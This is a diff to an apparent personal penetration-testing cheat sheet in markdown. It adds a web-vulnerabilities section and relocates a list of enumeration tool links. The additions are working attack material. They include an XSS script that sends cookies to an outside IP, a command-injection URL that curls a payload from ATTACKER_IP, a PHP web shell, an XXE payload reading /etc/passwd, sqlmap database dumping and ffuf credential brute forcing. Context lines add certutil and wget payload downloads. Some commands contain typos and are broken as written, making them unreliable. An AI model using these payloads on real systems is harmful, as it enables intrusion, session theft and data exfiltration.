@@ -386,18 +386,6 @@ certutil -urlcache -f http://ATTACKER_IP/payload.exe payload.exe
 ```shell
 wget http://ATTACKER_IP/payload.exe 
 ```
-# Useful recourse
-## Enumeration scripts:
-### 1. Windows:
-1. WinPEAS: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
-2. Seatbelt: https://github.com/GhostPack/Seatbelt
-3. JAWS: https://github.com/411Hall/JAWS
-### 2. Linux:
-1. LinPEAS: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
-2. LinEnum: https://github.com/rebootuser/LinEnum
-3. Linuxprivchecker: https://github.com/sleventyeleven/linuxprivchecker
-
-
 # Attacking Active Directory: Initial Attack Vectors
 ## LLMNR poisoning
 * LLMNR is used to identify hosts when DNS fails to do so
@@ -583,15 +571,64 @@ proxychains <TOOL>
 ```shell
 sudo pip install sshuttle
 sshuttle -r root@<IP_VICTIM> <IP/CIDR> --ssh-cmd "ssh -i id_rsa"
-
-
-
-
-
-
-
-
-
-
-
-
+```
+# Web Vulnerabilities
+## SQL injection
+* Intercept the request with Burp Suite
+* Checking whether the site is substantial to SQLi 
+```shell
+sqlmap -r req.txt --level=2 
+```
+* Dumping the databases
+```shell
+sqlmap -r req.txt --level=2 --dupm
+```
+## XSS
+```html
+<script>var i = new Image();i.src = "http://192.168.57.4:9080?" + document.cookie;</script>
+```
+## Command injection 
+* Transfer the payload for the target
+```URL
+http://<TARGET_IP> && curl <ATTACKER_IP>:8080/payload > /var/www/html/payload
+```
+* Open a listener 
+## Insecure file upload
+1. Intercept HTTP request
+2. Inject the payload
+```PHP
+<? php system([$_GET'cmd']) ?>
+```
+* Check where is the upload directory
+* If PHP extension, search for magic bytes
+* If there is a block list for certain extensions, search for other extensions
+## Attacking authentication 
+```shell
+ffuf -request request.txt -request-proto http -mode clusterbomb -w PASSWORDS.txt:FUZZPASS -w /usr/share/seclists/top-usernames.txt -fs (size of the request)
+```
+## XEE
+```xml
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+  <!ELEMENT root ANY >
+  <!ENTITY test SYSTEM "file:///etc/passwd" >
+]>
+<root>&test;</root>
+```
+## IDOR
+```shell
+pyhton3 -c 'for i in range(1,2001): print(1)' > numbers.txt
+ffuf -u 'domain.com/directory=FUZZ' -w numbers.txt -fs XXX | grep FUZZ
+```
+# Useful recourse
+## Enumeration scripts:
+### 1. Windows:
+1. WinPEAS: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
+2. Seatbelt: https://github.com/GhostPack/Seatbelt
+3. JAWS: https://github.com/411Hall/JAWS
+### 2. Linux:
+1. LinPEAS: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
+2. LinEnum: https://github.com/rebootuser/LinEnum
+3. Linuxprivchecker: https://github.com/sleventyeleven/linuxprivchecker
+* Payloads
+https://github.com/swisskyrepo/PayloadsAllTheThings
